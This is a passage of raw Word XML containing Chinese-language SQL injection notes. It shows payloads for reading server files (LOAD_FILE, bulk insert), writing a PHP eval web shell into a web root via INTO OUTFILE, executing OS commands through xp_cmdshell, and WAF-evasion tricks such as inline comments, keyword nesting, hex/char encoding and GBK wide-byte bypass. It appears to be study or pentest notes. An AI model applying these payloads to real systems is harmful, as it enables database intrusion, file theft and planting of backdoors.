      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>提供了</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>LOAD_FILE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>函数，该函数可以直接传递结果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  <w:t>SELECT LOAD_FILE(‘c:\1.txt’);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="14"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Server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先创建一张</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>cimer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>表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'; create table cimer(line varchar(8000));--</w:t>
      </w:r>
      <w:r w:rsidR="00AA5689">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">bulk insert </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>复制文件</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>,bulk insert</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>用户指定的一个格式复制一个数据文件至数据库表或视图中：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>'; bulk insert cimer from 'c:\1.txt';--</w:t>
      </w:r>
      <w:r w:rsidR="00446955">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00130DE0" w:rsidRDefault="00130DE0" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>或者使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>insert into</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00130DE0" w:rsidRDefault="00130DE0" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>insert into cimer(line) values(load_file('c:\\ddd\\ddd\\ddd.txt'));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查询表中的刚刚复制进去的数据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'union select * from cimer;--</w:t>
      </w:r>
      <w:r w:rsidR="000D2343">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>写文件</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="53"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>MySQL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写文件可以使用</w:t>
      </w:r>
      <w:r w:rsidR="00DB5923">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select</w:t>
      </w:r>
      <w:r w:rsidR="00DB5923">
        <w:t xml:space="preserve"> “bytes”</w:t>
      </w:r>
      <w:r w:rsidR="00DB5923">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> into outfile </w:t>
      </w:r>
      <w:r w:rsidR="00DB5923">
        <w:t>“path/to/file”</w:t>
      </w:r>
      <w:r w:rsidR="00DB5923">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，或者</w:t>
      </w:r>
      <w:r w:rsidR="00DB5923">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">select </w:t>
      </w:r>
      <w:r w:rsidR="00DB5923">
        <w:t>“string” into dump file “path/to/file”</w:t>
      </w:r>
      <w:r w:rsidR="00CD0D46">
        <w:t>。</w:t>
      </w:r>
      <w:bookmarkStart w:id="46" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="46"/>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>SELECT 'cimer' into outfile 'c:/2.txt';</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1680"/>
      </w:pPr>
      <w:r>
        <w:t>select '&lt;?php @eval($_POST[pass]);?&gt;'INTO OUTFILE 'D:/php/PHPnow-1.5.6/htdocs/2.php'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>SQL Server</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="005C2440">
      <w:pPr>
        <w:ind w:left="1260"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>MsSQL 7</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>2005</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>均包含一个名为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>xp_cmdshell</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>的扩展存储过程，可以通</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>过调用该存储过程来执行操作系统命令。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>exec xp_cmdshell 'echo cimer 1 &gt; c:\test.txt'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>exec xp_cmdshell 'echo cimer 2 &gt;&gt; c:\test.txt'</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="008E66FD" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>读写</w:t>
      </w:r>
      <w:r>
        <w:t>技巧</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E66FD" w:rsidRDefault="008E66FD" w:rsidP="008E66FD">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>ascii</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
      <w:r>
        <w:t>进行绕过：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E66FD" w:rsidRDefault="008E66FD" w:rsidP="008E66FD">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840"/>
      </w:pPr>
      <w:r>
        <w:t>load_file(char(32,26,56,66))</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E66FD" w:rsidRPr="008E66FD" w:rsidRDefault="008E66FD" w:rsidP="008E66FD">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>load_file(0x633A5C626F6F742E696E69)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008E66FD" w:rsidRDefault="008E66FD" w:rsidP="00912F6A"/>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="000322A3">
      <w:pPr>
        <w:pStyle w:val="10"/>
      </w:pPr>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00912F6A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注入绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C46C62" w:rsidRDefault="00912F6A" w:rsidP="00C46C62">
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:tab/>
        <w:t>sql</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>过滤关键字一般有：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>select,and,insert,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>引号，空格</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C46C62" w:rsidRPr="00B75BE3" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用大小写</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C46C62" w:rsidRPr="00B75BE3" w:rsidRDefault="00C46C62" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>替换</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:t>关键字</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C46C62" w:rsidRDefault="00C46C62" w:rsidP="00C46C62">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>类似</w:t>
      </w:r>
      <w:r w:rsidRPr="00C46C62">
        <w:t>z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C46C62" w:rsidRDefault="00C46C62" w:rsidP="00C46C62">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>根据</w:t>
      </w:r>
      <w:r>
        <w:t>嵌套的层次进行绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00B75BE3" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>注释</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r w:rsidR="001F2793">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="001F2793">
        <w:t>||</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>代替</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:t>空格</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00BB7E5B" w:rsidRPr="00EB3236" w:rsidRDefault="00BB7E5B" w:rsidP="00BB7E5B">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>普通</w:t>
      </w:r>
      <w:r>
        <w:t>注释</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r w:rsidR="001F2793">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="001F2793">
        <w:t>||</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:t>一般用于</w:t>
      </w:r>
      <w:r w:rsidR="00391A31">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>代替</w:t>
      </w:r>
      <w:r>
        <w:t>空格</w:t>
      </w:r>
      <w:r w:rsidR="001F2793">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="001F2793">
        <w:t>其中</w:t>
      </w:r>
      <w:r w:rsidR="001F2793" w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>||</w:t>
      </w:r>
      <w:r w:rsidR="001F2793" w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>适用于</w:t>
      </w:r>
      <w:r w:rsidR="001F2793" w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r w:rsidR="001F2793" w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidR="001F2793" w:rsidRPr="00EB3236">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidR="001F2793" w:rsidRPr="00EB3236">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>适用于</w:t>
      </w:r>
      <w:r w:rsidR="00246CE0" w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>MSSQL</w:t>
      </w:r>
      <w:r w:rsidR="003A39AB" w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00620120" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:tab/>
        <w:t>mysql</w:t>
      </w:r>
      <w:r w:rsidRPr="00EB3236">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>可以使用内联注释</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="00620120">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:t>/**/</w:t>
      </w:r>
      <w:r w:rsidRPr="009D1325">
        <w:rPr>
          <w:strike/>
        </w:rPr>
        <w:t>UN/**/ION</w:t>
      </w:r>
      <w:r>
        <w:t>/**/</w:t>
      </w:r>
      <w:r w:rsidRPr="009D1325">
        <w:rPr>
          <w:strike/>
        </w:rPr>
        <w:t>SEL/**/ECT</w:t>
      </w:r>
      <w:r>
        <w:t>/**/password/**/</w:t>
      </w:r>
      <w:r w:rsidRPr="009D1325">
        <w:rPr>
          <w:strike/>
        </w:rPr>
        <w:t>FR/**/OM</w:t>
      </w:r>
      <w:r>
        <w:t>/**/users/**/</w:t>
      </w:r>
      <w:r w:rsidRPr="009D1325">
        <w:rPr>
          <w:strike/>
        </w:rPr>
        <w:t>WHE/**/RE</w:t>
      </w:r>
      <w:r>
        <w:t>/**/username/**/LIKE/**/’admin’—</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C46C62" w:rsidRDefault="00912F6A" w:rsidP="00912F6A">
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
      </w:r>
      <w:r>
        <w:tab/>
        <w:t>'/*!UNION*/ select password from users where username=’admin’—</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRPr="00B75BE3" w:rsidRDefault="00912F6A" w:rsidP="00BA22DE">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>使用编码</w:t>
      </w:r>
      <w:r w:rsidR="0049123A" w:rsidRPr="00B75BE3">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>绕过</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0049123A" w:rsidRPr="0049123A" w:rsidRDefault="0049123A" w:rsidP="0049123A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="840" w:firstLineChars="0" w:firstLine="0"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>绕过是通过编码使注入语句绕过</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>waf</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>但是在</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>命令行</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>层面还是标准的</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>语句</w:t>
      </w:r>
      <w:r w:rsidRPr="0049123A">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="0049123A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
      </w:pPr>
      <w:r>
        <w:t>url</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003551D4" w:rsidRDefault="003551D4" w:rsidP="003551D4">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="1260" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>一般</w:t>
      </w:r>
      <w:r>
        <w:t>情况下</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码很难</w:t>
      </w:r>
      <w:r>
        <w:t>实现</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>绕过</w:t>
      </w:r>
      <w:r>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009F7854" w:rsidRDefault="009F7854" w:rsidP="009F7854">
      <w:pPr>
        <w:ind w:left="840" w:firstLine="420"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>一般</w:t>
      </w:r>
      <w:r>
        <w:t>系统会自动做一次</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>解码</w:t>
      </w:r>
      <w:r>
        <w:t>（不清楚是服务器还是浏览器完成），</w:t>
      </w:r>
      <w:r w:rsidR="007D74A1">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>但是</w:t>
      </w:r>
      <w:r>
        <w:t>如果服务端存在二次解码的代码，就可以利用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>多次</w:t>
      </w:r>
      <w:r>
        <w:t>编码的方式进行绕过。</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003551D4" w:rsidRDefault="003551D4" w:rsidP="003551D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十六</w:t>
      </w:r>
      <w:r>
        <w:t>进制编码</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00912F6A" w:rsidRDefault="00912F6A" w:rsidP="003551D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双字节</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>编码</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C46C62" w:rsidRDefault="00912F6A" w:rsidP="003551D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511148" w:rsidRPr="00BB26FF" w:rsidRDefault="00511148" w:rsidP="003551D4">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="19"/>
        </w:numPr>
        <w:ind w:firstLineChars="0"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BB26FF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>宽</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB26FF">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>字节</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB26FF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>GBK</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB26FF">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>字符</w:t>
      </w:r>
      <w:r w:rsidRPr="00BB26FF">
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>编码绕过！</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00511148" w:rsidRDefault="00511148" w:rsidP="00511148">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:ind w:left="1260" w:firstLineChars="0" w:firstLine="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>%bf %df %ef</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>都</w:t>
      </w:r>
      <w:r>
        <w:t>可以</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00EB7545" w:rsidRDefault="00EB7545" w:rsidP="00CA0CA4">
      <w:pPr>
        <w:pStyle w:val="3"/>
        <w:numPr>
